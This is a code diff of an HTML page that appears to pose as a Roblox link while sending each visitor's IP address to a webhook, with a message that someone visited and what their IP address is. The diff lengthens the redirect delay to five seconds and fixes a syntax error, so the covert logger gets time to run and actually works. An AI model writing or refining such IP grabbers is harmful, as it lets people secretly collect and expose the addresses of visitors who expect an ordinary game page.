@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta http-equiv="refresh" content="0; url=https://www.roblox.com/home">
+  <meta http-equiv="refresh" content="5; url=https://www.roblox.com/home"> <!-- Delay of 5 seconds -->
 </head>
 <body>
   <input type="text" id="ip" value="">
@@ -19,7 +19,9 @@
       xhr2.open('POST', webhookUrl, true);
       xhr2.setRequestHeader('Content-type', 'application/json');
       xhr2.send(JSON.stringify({ content: 'Someone visited the website and their IP address is: ' + ip }));
+    };
     xhr.send();
   </script>
 </body>
 </html>
+
